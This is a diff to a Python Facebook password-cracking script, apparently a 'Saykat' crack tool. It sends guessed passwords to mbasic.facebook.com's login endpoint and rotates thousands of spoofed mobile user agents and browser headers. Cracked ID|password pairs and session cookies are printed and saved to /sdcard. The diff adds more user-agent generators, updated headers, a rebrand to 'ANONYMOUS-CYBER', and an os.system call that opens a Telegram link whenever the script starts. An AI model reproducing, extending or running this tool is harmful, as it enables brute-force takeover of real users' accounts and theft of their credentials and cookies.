@@ -94,6 +94,7 @@ ta = current.year
 bu = current.month
 ha = current.day
 today = date.today()
+os.system("xdg-open https://t.me/AN0NYM0U5_CY83R")
 logo = ("""
 
 \033[38;5;196m       _____ _____  ____ __ ___  ______
@@ -101,8 +102,7 @@ logo = ("""
 \033[36;1m   \__ \/ /| |\  / ,<  / /| | / /   
 \033[36;1m   ___/ / ___ |/ / /| |/ ___ |/ /    
 \033[34;1m  /____/_/  |_/_/_/ |_/_/  |_/_/     
-                                                                                                                         
-\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m═════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]
+                                                           
 \033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m═════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]
      \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m CREATED BY\33[0;m   :  \033[1;96m  Saykat
      \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m FACEBOK      : \033[1;34m   Saykat Gaming
@@ -169,7 +169,57 @@ for xd in range(10000):
     l='Mobile Safari/537.36'
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
     ugen.append(uaku2)
-    
+for ua in range(5000):
+      a='Mozilla/5.0 (Linux; Android'
+      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
+      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
+      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+      d=random.randrange(40,115)
+      e='0'
+      f=random.randrange(3000,6000)
+      g=random.randrange(20,100)
+      h='Mobile Safari/537.36'
+      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
+      ugen.append(ug)
+for ua in range(5000):
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['8','9','10','11','12','13','14','15'])
+	c='itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=random.randrange(40,115)
+	e='0'
+	f=random.randrange(3000,6000)
+	g=random.randrange(20,100)
+	h='Mobile Safari/537.36'
+	alhaj=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+	ugen.append(alhaj)
+for ua in range(5000):
+    a='NokiaX'
+    b=random.randrange(1,9)
+    c='-0'
+    d=random.randrange(1,9)
+    e='/'
+    f=random.randrange(1,9)
+    g='.0 ('
+    h=random.randrange(1,12)
+    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
+    j='UNTRUSTED/'
+    k=random.randrange(1,3)
+    l='.0'
+    alhaj=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
+    ugen.append(alhaj)
+
+for ua in range(5000):
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['8','9','10','11','12','13','14','15'])
+	y=random.choice(['RMX3571','RMX3511','RMX3461','RMX3741','RMP2107','RMX3572','RMX1921','RMX3121','RMX3121','RMX3350','RMX3511'])
+	c='Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=random.randrange(40,115)
+	e='0'
+	f=random.randrange(3000,6000)
+	g=random.randrange(20,100)
+	h='Mobile Safari/537.36'
+	alhaj=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
+	ugen.append(alhaj)    
 
 def samiya(uid):
     if len(uid)==15:
@@ -273,23 +323,27 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority': 'mbasic.facebook.com',
-            "method": 'POST',
-            "scheme": 'https',
+            'method': 'GET',
+            'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-BD,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
+            'dpr': '2',
+            'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=Afeu87ocu_9wCyybuUYaLqoME1zGNPv-S90KJX4rqv8Pbv3egYsDofgwftzEklhRi6fo-3jrfgR_rlk9A9fbHhnAVCP4845w0xDzM2FEWqjAwQ&smuh=13191&lh=Ac_Xiz_kQgN15eTEmo0&wtsid=rdr_0SR78TSbIhy2QwCOA&ref_component=mbasic_footer&_rdr',
             'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.57"',
             'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"itel S661LP"',
             'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"12.0.0"',
+            'sec-ch-ua-platform-version': '"11.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
+            'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            "user-agent": pro}
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+            'viewport-width': '980',}
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -297,7 +351,7 @@ def rcrack(uid,pwx,tl):
                 cid = coki[7:22]
                 print('\r\r\033[1;32m [SAYKAT-OK] ' +cid+ ' | ' +ps+    '  \n \033[1;33mCOOKIE= \033[1;32m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/SAYKAT.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/SAYKAT-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
@@ -310,7 +364,7 @@ def rcrack(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\r%s {x}[{xr} SAYKAT-CYBER {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+        sys.stdout.write(f'\r\r%s {x}[{xr} ANONYMOUS-CYBER {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
         sys.stdout.flush()
     except:
         pass
